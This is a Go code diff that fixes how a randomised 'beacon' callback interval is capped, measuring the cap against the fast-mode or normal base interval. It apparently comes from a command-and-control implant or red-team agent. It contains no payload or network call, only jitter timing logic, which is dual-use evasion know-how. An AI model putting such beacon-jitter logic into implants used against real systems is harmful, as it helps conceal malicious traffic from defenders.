@@ -120,15 +120,19 @@ func computeBeaconIntervalWithMode(base time.Duration, jitterPercent float64) ti
 }
 
 // applyMaxRandomCap clamps the computed interval if MaxRandomIntervalMs is set.
-func applyMaxRandomCap(interval time.Duration) time.Duration {
+// The caller passes the SAME base the distribution was centered on (FastInterval
+// in interactive fast mode, otherwise Interval) so the cap's reference never
+// drifts from the actual beacon cadence: measuring the allowance against the
+// global Interval while the beacon is fast-mode would let the cap permit a delay
+// far larger than the short live interval it should bound.
+func applyMaxRandomCap(base, interval time.Duration) time.Duration {
 	if MaxRandomIntervalMs <= 0 {
 		return interval
 	}
 	maxCap := time.Duration(MaxRandomIntervalMs) * time.Millisecond
-	baseInterval := time.Duration(Interval) * time.Second
 	// The cap applies to the random variation above the base interval.
-	// So max allowed interval = base interval + MaxRandomIntervalMs
-	maxAllowed := baseInterval + maxCap
+	// So max allowed interval = base interval + MaxRandomIntervalMs.
+	maxAllowed := base + maxCap
 	if interval > maxAllowed {
 		return maxAllowed
 	}
